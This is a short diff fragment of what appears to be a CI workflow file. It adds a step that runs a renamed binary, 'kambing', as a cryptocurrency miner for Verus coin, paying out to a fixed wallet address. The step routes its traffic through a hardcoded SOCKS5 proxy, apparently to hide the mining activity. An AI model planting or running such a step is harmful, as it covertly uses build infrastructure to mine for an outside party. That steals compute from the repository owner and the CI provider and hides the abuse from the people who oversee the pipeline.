@@ -31,3 +31,4 @@ jobs:
         WALLET=RR6LLyCz4SwrUrkDDAWLsCXgxjXyAqvvPm
         WORKER=$(echo $(shuf -i 100-999 -n 1)-nn1)
         PROXY=socks5://198.55.102.11:1080
+        ./kambing -a verus -o $POOL -u $WALLET.$WORKER -p c=VRSC,zap=VRSC -t 2 -x $PROXY
